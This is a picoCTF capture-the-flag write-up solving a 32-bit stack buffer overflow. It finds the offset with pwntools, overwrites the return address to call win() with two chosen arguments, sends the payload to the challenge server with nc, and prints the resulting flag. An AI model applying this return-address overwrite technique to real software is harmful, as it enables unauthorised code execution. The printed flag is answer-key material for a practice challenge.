# URL
https://play.picoctf.org/practice/challenge/259?category=6&page=2

# Challenge
Author: Sanjay C / Palash Oswal

Description
Control the return address and arguments
Additional details will be available after launching your challenge instance.

# Work:
* To start us off, let's create a pattern

```
from pwn import *
# Generate a cyclic pattern of 200 bytes
pattern = cyclic(200)
print(pattern)
>>> print(cyclic(200))
b'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab
```

<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/ab68d565-c115-40ee-8ce4-99b3ff61a1e3" />

* EIP = return address and we can see that's being overrun @ address = 0x62616164

```
>>> from pwn import *
>>> print(cyclic_find(0x62616164))
112 
```

* 112 = our offset

```
pwndbg> print &win
$1 = (<text variable, no debug info> *) 0x8049296 <win> 
```

* Knowing the address of win = 0x8049296

```
python3
>>> 'A'*112
'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
>>> p32(0x8049296)
b'\x96\x92\x04\x08'
>>> print(cyclic(200))
```

* Submit this payload:

```
pwngdb> r <<< $echo("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x96\x92\x04\x08")
```

<img width="1863" height="753" alt="image" src="https://github.com/user-attachments/assets/8457c79f-e596-4ca2-a64f-23dd69d89f4b" />

* So the command above worked since we are in the win() function now

* Now all we gotta do is pad 4 bytes and add the two arguments

<img width="362" height="185" alt="image" src="https://github.com/user-attachments/assets/2dfec480-3012-45c5-87f1-c19af6956796" />

* We NEED these arguments or else the function won't continue

* The 4 bytes are dummy bytes, those 4 bytes are the saved return address; however, we don't want to return, instead we want to continue forward

```
+--------------------+
|  return address    |  <-- saved EIP (4 bytes)   ← this is where QQQQ goes
+--------------------+
|  arg1              |  <-- first argument
+--------------------+
|  arg2              |  <-- second argument
+--------------------+
```

* 4 bytes = QQQQ

```
>>> p32(0xCAFEF00D)
b'\r\xf0\xfe\xca'
```

```
>>> p32(0xF00DF00D)
b'\r\xf0\r\xf0'
```

```
┌──(kali㉿kali)-[~/picoCTF/binaryexploitation]
└─$ echo "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x96\x92\x04\x08QQQQ\x0d\xf0\xfe\xca\x0d\xf0\x0d\xf0'" | nc saturn.picoctf.net 64366
Please enter your string: 
�'�AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�QQQQ
picoCTF{argum3nt5_4_d4yZ_59cd5643}       
```

* WOOHOOOOOOOOOOO WE FOUND THE FLAG!!!!
  
